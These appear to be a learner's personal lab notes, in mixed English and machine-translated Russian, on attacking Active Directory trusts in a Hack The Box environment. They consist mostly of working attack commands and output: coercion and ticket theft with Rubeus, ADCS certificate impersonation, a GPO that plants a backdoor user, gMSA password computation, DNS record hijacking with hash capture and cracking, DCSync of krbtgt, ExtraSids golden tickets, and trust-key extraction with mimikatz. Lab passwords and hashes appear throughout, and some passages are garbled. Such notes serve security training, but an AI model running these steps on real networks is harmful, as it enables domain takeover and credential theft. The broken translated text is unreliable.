# Domain_trust
in Forest
# Unconstrained Delegation

PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap

.\SpoolSample.exe dc01.inlanefreight.ad dc02.dev.inlanefreight.ad

.\Rubeus.exe renew /ticket:doIFvDCCBbigAwIBBaEDAgEWooIEuDCCBLRhggSwMIIErKADAgEFoRIbEElOTEFORUZSRUlHSFQuQUSiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEElOTEFORUZSRUlHSFQuQUSjggRoMIIEZKADAgESoQMCAQKiggRWBIIEUiKGeH01HZmPH6nlwjHAsXxDQdgn4SHCFrQwQRpZtxJHXQPzFIIqF9t8oCv6DUuwNYjh+pPHId3un39FC56ywWuwDjlLKI1MEFwlbPScO4JASAxE09MWMxyBDwjGs6dJZAG+roiHzHhetBCkBo5qel5lM28VYhv6qe5Eg43Cxmu5BQ9TRzssrtPuwhx9UAspIzfyV7a00gMnZKX6IZKc6yU+dhGJoICeFAHcFIvjHl0+m8l6BQG25uJOtuUREwpMWJ7F1Gv8kkWHLYjKZJ6Bhu5mITSfPFFY6nHViltdMN9JYiNcnBuGnTnNp+AVZKGU8RtBU5OAbQmYOJWCBSKY+R7ysPwwIeYBuiZ1gazmXVxellEnK2DAdkQNUp/nYxdZNM8CtNv<SNIP> /ptt

dir \\.......

# Configuration Naming Context (NC)
Enumerate ACL's for WRITE access on Configuration Naming Context
PS C:\Users\Administrator> $dn = "CN=Configuration,DC=INLANEFREIGHT,DC=AD"
PS C:\Users\Administrator> $acl = Get-Acl -Path "AD:\$dn"
PS C:\Users\Administrator> $acl.Access | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|Write" }

# Abusing ADCS
PS C:\Tools\> .\PsExec -s -i powershell
PS C:\Windows\system32> mmc
Request the Created Certificate
.\Certify.exe request /ca:inlanefreight.ad\INLANEFREIGHT-DC01-CA /domain:inlanefreight.ad /template:"Copy of User" /altname:INLANEFREIGHT\Administrator
Use Regex to Format the Certificate
mxdelta@htb[/htb]$ sed -i 's/\s\s\+/\n/g' cert.pem
mxdelta@htb[/htb]$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
PS C:\Tools> PS C:\Tools> .\Rubeus.exe asktgt /domain:inlanefreight.ad /user:Administrator /certificate:cert.pfx /ptt

# GPO On Site Attack
Create Group Policy Object (GPO)
PS C:\Tools> $gpo = "Backdoor"
PS C:\Tools> New-GPO $gpo
DisplayName      : Backdoor
DomainName       : dev.INLANEFREIGHT.AD
Owner            : DEV\Domain Admins
Id               : 656b8436-38f4-447c-9405-40ac83c34117
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 2/20/2024 6:04:59 AM
ModificationTime : 2/20/2024 6:04:59 AM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :

Create a Scheduled Task inside GPO that Adds New User
PS C:\Tools> Import-Module .\PowerView_2.ps1
PS C:\Tools> New-GPOImmediateTask -Verbose -Force -TaskName 'Backdoor' -GPODisplayName "Backdoor" -Command C:\Windows\System32\cmd.exe -CommandArguments "/c net user backdoor B@ckdoor123 /add"
VERBOSE: Get-DomainSearcher search string: LDAP://DC=dev,DC=INLANEFREIGHT,DC=AD
VERBOSE: Trying to weaponize GPO: {656B8436-38F4-447C-9405-40AC83C34117}

Retrieving the Replication Site of the Root Domain Controller
PS C:\Tools> Get-ADDomainController -Server inlanefreight.ad |Select ServerObjectDN
ServerObjectDN
--------------
CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=INLANEFREIGHT,DC=AD

Linking the GPO to the Default Site as SYSTEM

        PowerShell-Session
PS C:\Tools> .\PsExec.exe -s -i powershell.exe
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> $sitePath = "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=INLANEFREIGHT,DC=AD"
PS C:\Windows\system32> New-GPLink -Name "Backdoor" -Target $sitePath -Server dev.inlanefreight.ad
GpoId       : 656B8436-38F4-447C-9405-40AC83C34117
DisplayName : Backdoor
Enabled     : True
Enforced    : False
Target      : CN=Default-First-Site-Name,cn=Sites,CN=Configuration,DC=INLANEFREIGHT,DC=AD
Order       : 1 

Request a TGT for Backdoor

        PowerShell-Session
PS C:\Tools> .\Rubeus.exe asktgt /user:backdoor /password:'B@ckdoor123' /domain:inlanefreight.ad /ptt

# GoldenGMSA Attack
Creating New gMSA Account

        PowerShell-Session
PS C:\Users\Administrator> New-ADServiceAccount -Name "apache-dev" -DNSHostName "inlanefreight.ad" -PrincipalsAllowedToRetrieveManagedPassword htb-student-1 -Enabled $True

Use Psexec to open PowerShell as a SYSTEM user.

        PowerShell-Session
C:\Tools\> .\PsExec -s -i powershell

Enumerating gMSA in Parent Domain

        PowerShell-Session
PS C:\Tools> .\GoldenGMSA.exe gmsainfo --domain inlanefreight.ad
sAMAccountName:         svc_devadm$
objectSid:              S-1-5-21-2879935145-656083549-3766571964-1106
rootKeyGuid:            ba932c0c-5c34-ce6e-fcb8-d441d116a736
msds-ManagedPasswordID: AQAAAEtEU0sCAAAAaQEAABEAAAAfAAAADCyTujRcbs78uNRB0RanNgAAAAAiAAAAIgAAAEkATgBMAEEATgBFAEYAUgBFAEkARwBIAFQALgBBAEQAAABJAE4ATABBAE4ARQBGAFIARQBJAEcASABUAC4AQQBEAAAA
----------------------------------------------

Retrieving gMSA Password

        PowerShell-Session
PS C:\Tools> .\GoldenGMSA.exe compute --sid "S-1-5-21-2879935145-656083549-3766571964-1106" --forest dev.inlanefreight.ad --domain inlanefreight.ad
Base64 Encoded Password:        WITSKRtGahQFvL/iUmJfQbRIJ7S7GMW+nKUj+TlJ4YZJyZ6pjlp5caC78rC4oY6woKxe294/hPCCl6nL2NNWSmj6f1GlmFKvizvlABXVpLqIGbQvyZEbYhPr+twasnf4m+B0qmwj4fXUx8qQAy+cEIV8sd18ZvOLKet7259cIbXTV1lbO3gxIEmDDjMmgP6QD1GQDHnr4xxgwR5YKZC9CbK01db3SWlpPYxElx30MGwzMLtL17ccxmGYAMzqNq/R9ldEq/hC4WDJ3hGg4CVagcOuHOQPOJ6Nh0+x4CBE46CoshfID+3wyswFI/akytdBDVyNk1hj9KH4v/kizCPw6A== 


Use Psexec to Open PowerShell as a SYSTEM User

        PowerShell-Session
C:\Tools\> .\PsExec -s -i powershell

Retrieving msds-ManagedPasswordID

        PowerShell-Session
PS C:\Tools> .\GoldenGMSA.exe gmsainfo --domain inlanefreight.ad
sAMAccountName:         svc_devadm$
objectSid:              S-1-5-21-2879935145-656083549-3766571964-1106
rootKeyGuid:            ba932c0c-5c34-ce6e-fcb8-d441d116a736
msds-ManagedPasswordID: AQAAAEtEU0sCAAAAaQEAABEAAAAfAAAADCyTujRcbs78uNRB0RanNgAAAAAiAAAAIgAAAEkATgBMAEEATgBFAEYAUgBFAEkARwBIAFQALgBBAEQAAABJAE4ATABBAE4ARQBGAFIARQBJAEcASABUAC4AQQBEAAAA
----------------------------------------------

Retrieving kdsinfo

        PowerShell-Session
PS C:\Tools> .\GoldenGMSA.exe kdsinfo --forest dev.inlanefreight.ad
Guid:           ba932c0c-5c34-ce6e-fcb8-d441d116a736
Base64 blob:    AQAAAAwsk7o0XG7O/LjUQdEWpzYAAAAAAQAAAAAAAAAkAAAAUwBQADgAMAAwAF8AMQAwADgAXwBDAFQAUgBfAEgATQBBAEMAHgAAAAAAAAABAAAADgAAAAAAAABTAEgAQQA1ADEAMgAAAAAAAAAEAAAARABIAAwCAAAMAgAAREhQTQABAACHqOYdtLZmPP+70ZxlGVmZjO72CGYN0PJdLO7UQ147AOAN+PHWGVfU+vffRWGyqjAWw9kRNAlvqjv0KW2DDpp8IJ4MZJdRer1aip0wa89n7ZH55nJbR1jAIuCx70J1v3tsW/wR1F+QiLlB9U6x5Zu4vDmgvxIwf1xP23DFgbI/drY6yuHKpreQLVJSZzVIig7xPG2aUb+kqzrYNHeWUk2O9qFntaQYJdln4UTlFAVkJRzKy4PmtIb2s8o/eXFQYCbAuFf2iZYoVt7UAQq9C+Yhw6OWClTnEMN18mN11wFBA6S1QzDBmK8SYRbSJ24RcV9pOHf61+8JytsJSukeGhWXP7Msm3MTTQsud1BmYO29SEynsY8h7yBUB/R5OhoLoSUQ28FQd75GP/9P7UqsC7VVvjpsGwxrR7G8N3O/foxvYpASKPjCjLsYpVrjE0EACmUBlvkxx3pX8t30Y+Xp7BRLd33mKqq4qGKKw3bSgtbtOGTmeYJCjryDHRQ0j28vkZO1BFrydnFk4d/JZ8H7Py5VpL0b/+g7nIDQUrmF0YLqCtsqO3MT0/4UyEhLHgUliLm30rvS3wFhmezQbhVXzQkVszU7u2Tg7Dd/0Cg3DfkrUseJFCjNxn62GEtSPR2yRsMvYweEkPAO+NZH0UjUeVRRXiMnz++YxYJmS0wPbMQWWQACAAAACAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAGgAAABDAE4APQBEAEMAMAAxACwATwBVAD0ARABvAG0AYQBpAG4AIABDAG8AbgB0AHIAbwBsAGwAZQByAHMALABEAEMAPQBJAE4ATABBAE4ARQBGAFIARQBJAEcASABUACwARABDAD0AQQBEADB1nboTh9kB6Iuz6L+G2QEAAAAAAAAAAEAAAAAAAAAAKDDqBWv0BE7GIm2X9sCjfDGzhSfRwXb6NzrI1IuP45cdQ/9JfY4Uot2JHFw3QEGXuFruFNjHAsitBmN+gs+Shw==                                                                                                                        ----------------------------------------------
----------------------------------------------

Computing the gMSA Password Manually

        PowerShell-Session
PS C:\Tools> .\GoldenGMSA.exe compute --sid "S-1-5-21-2879935145-656083549-3766571964-1106" --kdskey AQAAAAwsk7o0XG7O/LjUQdEWpzYAAAAAAQAAAAAAAAAkAAAAUwBQADgAMAAwAF8AMQAwADgAXwBDAFQAUgBfAEgATQBBAEMAHgAAAAAAAAABAAAADgAAAAAAAABTAEgAQQA1ADEAMgAAAAAAAAAEAAAARABIAAwCAAAMAgAAREhQTQABAACHqOYdtLZmPP+70ZxlGVmZjO72CGYN0PJdLO7UQ147AOAN+PHWGVfU+vffRWGyqjAWw9kRNAlvqjv0KW2DDpp8IJ4MZJdRer1aip0wa89n7ZH55nJbR1jAIuCx70J1v3tsW/wR1F+QiLlB9U6x5Zu4vDmgvxIwf1xP23DFgbI/drY6yuHKpreQLVJSZzVIig7xPG2aUb+kqzrYNHeWUk2O9qFntaQYJdln4UTlFAVkJRzKy4PmtIb2s8o/eXFQYCbAuFf2iZYoVt7UAQq9C+Yhw6OWClTnEMN18mN11wFBA6S1QzDBmK8SYRbSJ24RcV9pOHf61+8JytsJSukeGhWXP7Msm3MTTQsud1BmYO29SEynsY8h7yBUB/R5OhoLoSUQ28FQd75GP/9P7UqsC7VVvjpsGwxrR7G8N3O/foxvYpASKPjCjLsYpVrjE0EACmUBlvkxx3pX8t30Y+Xp7BRLd33mKqq4qGKKw3bSgtbtOGTmeYJCjryDHRQ0j28vkZO1BFrydnFk4d/JZ8H7Py5VpL0b/+g7nIDQUrmF0YLqCtsqO3MT0/4UyEhLHgUliLm30rvS3wFhmezQbhVXzQkVszU7u2Tg7Dd/0Cg3DfkrUseJFCjNxn62GEtSPR2yRsMvYweEkPAO+NZH0UjUeVRRXiMnz++YxYJmS0wPbMQWWQACAAAACAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAGgAAABDAE4APQBEAEMAMAAxACwATwBVAD0ARABvAG0AYQBpAG4AIABDAG8AbgB0AHIAbwBsAGwAZQByAHMALABEAEMAPQBJAE4ATABBAE4ARQBGAFIARQBJAEcASABUACwARABDAD0AQQBEADB1nboTh9kB6Iuz6L+G2QEAAAAAAAAAAEAAAAAAAAAAKDDqBWv0BE7GIm2X9sCjfDGzhSfRwXb6NzrI1IuP45cdQ/9JfY4Uot2JHFw3QEGXuFruFNjHAsitBmN+gs+Shw== --pwdid AQAAAEtEU0sCAAAAaQEAABEAAAAfAAAADCyTujRcbs78uNRB0RanNgAAAAAiAAAAIgAAAEkATgBMAEEATgBFAEYAUgBFAEkARwBIAFQALgBBAEQAAABJAE4ATABBAE4ARQBGAFIARQBJAEcASABUAC4AQQBEAAAA

Base64 Encoded Password:        WITSKRtGahQFvL/iUmJfQbRIJ7S7GMW+nKUj+TlJ4YZJyZ6pjlp5caC78rC4oY6woKxe294/hPCCl6nL2NNWSmj6f1GlmFKvizvlABXVpLqIGbQvyZEbYhPr+twasnf4m+B0qmwj4fXUx8qQAy+cEIV8sd18ZvOLKet7259cIbXTV1lbO3gxIEmDDjMmgP6QD1GQDHnr4xxgwR5YKZC9CbK01db3SWlpPYxElx30MGwzMLtL17ccxmGYAMzqNq/R9ldEq/hC4WDJ3hGg4CVagcOuHOQPOJ6Nh0+x4CBE46CoshfID+3wyswFI/akytdBDVyNk1hj9KH4v/kizCPw6A== 

Converting the Password to an NT hash

Because, gMSA passwords are encrypted with non-printable characters and are harder to use directly, we can use Python's hashlib library to calculate the NT hash for the account based on the obtained password.

        python
import hashlib
import base64
 
base64_input  = "WITSKRtGahQFvL/iUmJfQbRIJ7S7GMW+nKUj+TlJ4YZJyZ6pjlp5caC78rC4oY6woKxe294/hPCCl6nL2NNWSmj6f1GlmFKvizvlABXVpLqIGbQvyZEbYhPr+twasnf4m+B0qmwj4fXUx8qQAy+cEIV8sd18ZvOLKet7259cIbXTV1lbO3gxIEmDDjMmgP6QD1GQDHnr4xxgwR5YKZC9CbK01db3SWlpPYxElx30MGwzMLtL17ccxmGYAMzqNq/R9ldEq/hC4WDJ3hGg4CVagcOuHOQPOJ6Nh0+x4CBE46CoshfID+3wyswFI/akytdBDVyNk1hj9KH4v/kizCPw6A=="

print(hashlib.new("md4", base64.b64decode(base64_input)).hexdigest())

from Crypto.Hash import MD4
import base64

base64_input  = "WITSKRtGahQFvL/iUmJfQbRIJ7S7GMW+nKUj+TlJ4YZJyZ6pjlp5caC78rC4oY6woKxe294/hPCCl6nL2NNWSmj6f1GlmFKvizvlABXVpLqIGbQvyZEbYhPr+twasnf4m+B0qmwj4fXUx8qQAy+cEIV8sd18ZvOLKet7259cIbXTV1lbO3gxIEmDDjMmgP6QD1GQDHnr4xxgwR5YKZC9CbK01db3SWlpPYxElx30MGwzMLtL17ccxmGYAMzqNq/R9ldEq/hC4WDJ3hGg4CVagcOuHOQPOJ6Nh0+x4CBE46CoshfID+3wyswFI/akytdBDVyNk1hj9KH4v/kizCPw6A=="

print(MD4.new(base64.b64decode(base64_input)).hexdigest())

Converting Base64 Password to it's NT Hash

        shellsession
mxdelta@htb[/htb]$ python3 convert-to-nt.py
32ac66cd327aa76b3f1ca6eb82a801c5

Request a TGT for svc_devadm$

        PowerShell-Session
PS C:\Tools> .\Rubeus.exe asktgt /user:svc_devadm$ /rc4:32ac66cd327aa76b3f1ca6eb82a801c5 /domain:inlanefreight.ad /ptt
______        _

# DNS Trust Attack
Resolve Non-existing DNS Name

        powershell
PS C:\Tools> Resolve-DNSName TEST1.inlanefreight.ad
Resolve-DNSName : TEST1.inlanefreight.ad : DNS name does not exist
At line:1 char:1
+ Resolve-DNSName TEST1.inlanefreight.ad
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo          : ResourceUnavailable: (TEST1.inlanefreight.ad:String) [Resolve-DnsName], Win32Exception
+ FullyQualifiedErrorId : DNS_ERROR_RCODE_NAME_ERROR,Microsoft.DnsClient.Commands.ResolveDnsName     

Open PowerShell as SYSTEM

        PowerShell-Session
C:\Tools\> .\PsExec -s -i powershell

Adding Wildcard DNS Record

        powershell
PS C:\Tools> Import-module .\Powermad.ps1
PS C:\Tools> New-ADIDNSNode -Node * -domainController DC01.inlanefreight.ad -Domain inlanefreight.ad -Zone inlanefreight.ad -Tombstone -Verbose
VERBOSE: [+] Forest = INLANEFREIGHT.AD
VERBOSE: [+] Distinguished Name = DC=*,DC=inlanefreight.ad,CN=MicrosoftDNS,DC=DomainDNSZones,DC=inlanefreight,DC=ad
VERBOSE: [+] Data = 172.16.210.3
VERBOSE: [+] DNSRecord = 04-00-01-00-05-F0-00-00-5D-00-00-00-00-00-02-58-00-00-00-00-1E-9B-38-00-AC-10-D2-03
[+] ADIDNS node * added  

Resolve Non-existing DNS Name

        powershell
PS C:\Tools> Resolve-DNSName TEST2.inlanefreight.ad
Name                                           Type   TTL   Section    IPAddress
----                                           ----   ---   -------    ---------
TEST2.inlanefreight.ad                         A      599   Answer     172.16.210.3  

PS C:\Tools> Resolve-DNSName ANYTHING.inlanefreight.ad
Name                                           Type   TTL   Section    IPAddress
----                                           ----   ---   -------    ---------
ANYTHING.inlanefreight.ad                      A      599   Answer     172.16.210.3         


A SYSTEM in child DC can view all the DNS Records present in Parent domain.
Open PowerShell as SYSTEM

        PowerShell-Session
C:\Tools\> .\PsExec -s -i powershell

Enumerate DNS records in Parent Domain

        powershell
PS C:\Tools> Get-DnsServerResourceRecord -ComputerName DC01.inlanefreight.ad -ZoneName inlanefreight.ad -Name "@"

HostName                  RecordType Type       Timestamp            TimeToLive      RecordData
--------                  ---------- ----       ---------            ----------      ----------
@                         A          1          3/4/2024 3:00:00 PM  00:10:00        172.16.210.99
@                         NS         2          0                    01:00:00        dc01.inlanefreight.ad.
@                         SOA        6          0                    01:00:00        [95][dc01.inlanefreight.ad.][ho...
dc01                      A          1          0                    01:00:00        172.16.210.99
DEV01                     A          1          0                    01:00:00        172.16.210.7   


Изменение DNS-записи для DEV01

        PowerShell 
PS C:\Tools> $Old = Get-DnsServerResourceRecord -ComputerName DC01.INLANEFREIGHT.AD -ZoneName inlanefreight.ad -Name DEV01
PS C:\Tools> $New = $Old.Clone()
PS C:\Tools> $TTL = [System.TimeSpan]::FromSeconds(1)
PS C:\Tools> $New.TimeToLive = $TTL
PS C:\Tools> $New.RecordData.IPv4Address = [System.Net.IPAddress]::parse('172.16.210.3')
PS C:\Tools> Set-DnsServerResourceRecord -NewInputObject $New -OldInputObject $Old -ComputerName DC01.INLANEFREIGHT.AD -ZoneName inlanefreight.ad
PS C:\Tools> Get-DnsServerResourceRecord -ComputerName DC01.inlanefreight.ad -ZoneName inlanefreight.ad -Name "@"

HostName                  RecordType Type       Timestamp            TimeToLive      RecordData
--------                  ---------- ----       ---------            ----------      ----------
@                         A          1          3/15/2024 5:00:00 PM 00:10:00        172.16.210.99
@                         NS         2          0                    01:00:00        dc01.inlanefreight.ad.
@                         SOA        6          0                    01:00:00        [97][dc01.inlanefreight.ad.][ho...
dc01                      A          1          0                    00:20:00        172.16.210.99
DEV01                     A          1          0                    00:00:01        172.16.210.3


Проверьте изменение IP-адреса для DEV01.

        PowerShell 
PS C:\Tools> Resolve-DnsName -Name DEV01.inlanefreight.ad -Server DC01.INLANEFREIGHT.AD
Name                                           Type   TTL   Section    IPAddress
----                                           ----   ---   -------    ---------
DEV01.inlanefreight.ad                         A      599   Answer     172.16.210.3


Запустите Inveigh для перехвата хеша

        PowerShell 
PS C:\Tools> Import-Module .\Inveigh.ps1
PS C:\Tools> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -SMB Y

Взломайте хеш NTLMv2 с помощью Hashcat

        shellsession 
mxdelta@htb[/htb]$ hashcat -m 5600 buster_ntlmv2 /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

Запросите TGT для Бастера.

        PowerShell-сессия 
PS C:\Tools> .\Rubeus.exe asktgt /user:buster /domain:inlanefreight.ad /password:<SNIP> /ptt

# Атака ЭкстраСидс
Получите хэш KRBTGT для дочернего домена.

        PowerShell-сессия 
PS C:\Tools> .\mimikatz.exe "lsadump::dcsync /user:DEV\krbtgt" exit
.#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > https://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
'#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:DEV\krbtgt
[DC] 'dev.INLANEFREIGHT.AD' will be the domain
[DC] 'DC02.dev.INLANEFREIGHT.AD' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
Object RDN           : krbtgt
** SAM ACCOUNT **
SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 5/15/2023 5:39:11 AM
Object Security ID   : S-1-5-21-2901893446-2198612369-2488268720-502
Object Relative ID   : 502
Credentials:
Hash NTLM: 992093609707726257e0959ce3e24771
ntlm- 0: 992093609707726257e0959ce3e24771
lm  - 0: 3491756dfc7414817b971dff2e4a7834
<SNIP>


Получите SID дочернего домена.

        PowerShell-сессия 
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainSID
S-1-5-21-2901893446-2198612369-2488268720

Получите SID администраторов предприятия из родительского домена.

        PowerShell-сессия 
PS C:\Tools> Get-ADGroup -Identity "Enterprise Admins" -Server "inlanefreight.ad"
DistinguishedName : CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=AD
GroupCategory     : Security
GroupScope        : Universal
Name              : Enterprise Admins
ObjectClass       : group
ObjectGUID        : caa39c09-cb6e-4021-936f-afabfa6af908
SamAccountName    : Enterprise Admins
SID               : S-1-5-21-2879935145-656083549-3766571964-519

На данный момент мы собрали следующие данные:

    Хэш KRBTGT для дочернего домена: 992093609707726257e0959ce3e24771
    SID для дочернего домена: S-1-5-21-2901893446-2198612369-2488268720
    Имя целевого пользователя в дочернем домене: мы выберем Administrator
    Полное доменное имя (FQDN) дочернего домена: DEV.INLANEFREIGHT.AD
    SID группы Enterprise Admins корневого домена: S-1-5-21-2879935145-656083549-3766571964-519

Создание «золотого билета» с помощью Rubeus

        PowerShell-сессия 
PS C:\Tools> .\Rubeus.exe golden /rc4:992093609707726257e0959ce3e24771 /domain:dev.inlanefreight.ad /sid:S-1-5-21-2901893446-2198612369-2488268720 /sids:S-1-5-21-2879935145-656083549-3766571964-519 /user:Administrator /ptt

место RubeusМы также можем осуществить эту атаку и создать золотой билет, используя... MimikatzMimikatz предлагает еще один способ реализации ExtraSids attackи генерировать golden ticketsдля повышения привилегий.
Создание золотого билета с помощью Mimikatz

        команда 
C:\Tools> mimikatz.exe
.#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > https://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
'#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # kerberos::golden /user:Administrator /domain:dev.inlanefreight.ad  /sid:S-1-5-21-2901893446-2198612369-2488268720 /krbtgt:992093609707726257e0959ce3e24771 /sids:S-1-5-21-2879935145-656083549-3766571964-519 /ptt

User      : Administrator
Domain    : dev.inlanefreight.ad (DEV)
SID       : S-1-5-21-2901893446-2198612369-2488268720
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-2879935145-656083549-3766571964-519 ;
ServiceKey: 992093609707726257e0959ce3e24771 - rc4_hmac_nt
Lifetime  : 3/20/2024 5:41:55 AM ; 3/18/2034 5:41:55 AM ; 3/18/2034 5:41:55 AM
-> Ticket : ** Pass The Ticket **

    * PAC generated
    * PAC signed
    * EncTicketPart generated
    * EncTicketPart encrypted
    * KrbCred generated

Golden ticket for 'Administrator @ dev.inlanefreight.ad' successfully submitted for current session       

олучите доступ к DC01

        PowerShell-сессия 
PS C:\Tools> ls \\DC01\c$\Users\Administrator\Desktop
Directory: \\DC01\c$\Users\Administrator\Desktop


Автоматизация атаки с помощью raiseChild.py 
mxdelta@htb[/htb]$ proxychains raiseChild.py -target-exe 172.16.210.99 dev.inlanefreight.ad/htb-student
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Password: HTB_@cademy_stdnt!




# За лесом
Enumerate Users with SIDHistory Enabled

Get-ADUser -Filter * -Server "CHILD-DC.child.inlanefreight.ad"

# 1 Злоупотребление правами иностранных принципалов ACL

 Enumerate if SID History is enabled

PS C:\Tools> Import-Module .\PowerView.ps1

PS C:\Tools> Get-DomainTrust -domain logistics.ad

xfreerdp /u:htb-student /p:HTB_@cademy_stdnt /v:10.129.71.9 /dynamic-resolution /drive:share,/home/max/share

./Rubeus createnetonly /program:powershell.exe /show

.\Rubeus.exe asktgt /user:htb-student /password:HTB_@cademy_stdnt /domain:child.inlanefreight.ad /ptt

Get-ADGroupMember "SVC_ADMINS" -Server INLANEFREIGHT.AD

Get-DomainGroupMember -Identity 'SVC_ADMINS' -Domain inlanefreight.ad -Verbose

для юзера ---
Import-Module .\PowerView.ps1
$pass = ConvertTo-SecureString 'Test@1234!!!' -AsPlainText -Force
Set-DomainUserPassword -identity Administrator -AccountPassword $pass -domain inlanefreight.ad -verbose
.\Rubeus.exe asktgt /user:Administrator /password:'Test@1234!!!' /domain:inlanefreight.ad /ptt

через powershell
$pass = ConvertTo-SecureString 'Test@1234' -AsPlainText -Force
Set-ADAccountPassword -Identity Administrator -Server inlanefreight.ad -NewPassword $pass -Reset

для группы --- добавление в группу
Import-Module .\PowerView.ps1
Add-DomainGroupMember -identity 'Administrators' -Members 'child\htb-student' -Domain inlanefreight.ad -Verbose
in kali - sudo ~/Downloads/chisel client 10.129.71.9:8080 socks
 
 proxychains xfreerdp /u:htb-student /p:HTB_@cademy_stdnt /v:172.16.114.3 /dynamic-resolution /drive:share,/home/max/share
and search flag in admin desctop

#	2 EXTRA SID

проверка включена ли sid история в домене

Import-Module .\PowerView.ps1	

Get-DomainTrust -domain APEXCARGO.AD	

Get-DomainTrust -domain APEXCARGO.AD | Where-Object {$_.TargetName -eq "inlanefreight.ad"} | Select TrustAttributes

--> The results show the presence of TREAT_AS_EXTERNAL within the TrustAttributes field, indicating that SID History is indeed still enabled in the domain.

To perform this attack, we need the following:
    The KRBTGT hash for the current domain (INLANEFREIGHT.AD)
    The SID for the current domain (INLANEFREIGHT.AD)
    The name of a target user in the current domain (Administrator)
    The FQDN of the current domain. (INLANEFREIGHT.AD)
    The SID of the high privileged group of the target domain (HR_MANAGEMENT)

We are attacking from INLANEFREIGHT.AD to DC03.apexcargo.ad!!!!

.\mimikatz.exe "lsadump::dcsync /user:INLANEFREIGHT\krbtgt" exit
6f639a6054a3d9852409e9ad7e41893b

Import-Module .\PowerView.ps1

PS C:\Tools> Get-DomainSID -Domain INLANEFREIGHT.AD
S-1-5-21-1407615112-106284543-3058975305

Get-ADGroup -Identity 'HR_MANAGEMENT' -Server "APEXCARGO.AD"
S-1-5-21-990245489-431684941-3923950027-1112

 .\Rubeus.exe golden /rc4:6f639a6054a3d9852409e9ad7e41893b /domain:INLANEFREIGHT.AD /sid:S-1-5-21-1407615112-106284543-3058975305 /sids:S-1-5-21-990245489-431684941-3923950027-1112 /user:Administrator /ptt

 mimikatz # lsadump::dcsync /domain:APEXCARGO.AD /user:Administrator


proxychains nxc smb 172.16.114.10 -u Administrator -H 2cd9f13c4aa3b468308525a93696e5a1 -X "cat C:\Users\Administrator\Desktop\flag.txt"
proxychains xfreerdp /v:172.16.114.10 /u:Administrator /pth:2cd9f13c4aa3b468308525a93696e5a1 /dynamic-resolution /drive:share,/home/max/share

Enter-PSSession DC03.apexcargo.ad

# 3 Атака на доверенный аккаунт (Trust Account Attack)  атакуем MSSP.AD --> [ Out ] MSSP.AD -> APEXCARGO.AD

proxychains evil-winrm -i 172.16.114.10 -u administrator -H 2cd9f13c4aa3b468308525a93696e5a1
upload tools.zip
Expand-Archive -Path "tools.zip" -DestinationPath ".\tools"

 Get-ADTrust -Identity mssp.ad
 
 Extracting the Forest Trust Keys
 загружаем mimikatz.exe
 
 printf 'use C$\ncd Windows\\Temp\nput /home/max/share/mimikatz.exe\nls mimikatz.exe\nexit\n' | proxychains smbclient.py APEXCARGO.AD/Administrator@172.16.114.10 -hashes :2cd9f13c4aa3b468308525a93696e5a1
 
proxychains nxc smb 172.16.114.10 -u Administrator -H 2cd9f13c4aa3b468308525a93696e5a1 -x 'C:\Windows\Temp\mimikatz.exe "privilege::debug" "lsadump::trust /patch /name:MSSP.AD" "exit"'

 proxychains nxc smb 172.16.114.10 -u Administrator -H 2cd9f13c4aa3b468308525a93696e5a1 -x 'C:\Users\Administrator\Documents\tools\mimikatz.exe "privilege::debug" "lsadump::trust /patch /name:MSSP.AD" "exit"'
 [ Out ] MSSP.AD -> APEXCARGO.AD * rc4_hmac_nt       dfa31016f0e6c91ef6e0b724a7457c0e
 
proxychains nxc ldap 172.16.114.10 -u Administrator -H 2cd9f13c4aa3b468308525a93696e5a1 -d APEXCARGO.AD --get-sid
Domain SID S-1-5-21-990245489-431684941-3923950027

 
 [ Out ] MSSP.AD -> APEXCARGO.AD
 * rc4_hmac_nt       dfa31016f0e6c91ef6e0b724a7457c0e
 9384875ff5e9f363a7bde305b72e2f7e
 получаем билет MSSP.AD
 
 proxychains getTGT.py MSSP.AD/'APEXCARGO$' -hashes :9384875ff5e9f363a7bde305b72e2f7e -dc-ip 172.16.114.15

проверка работы билета

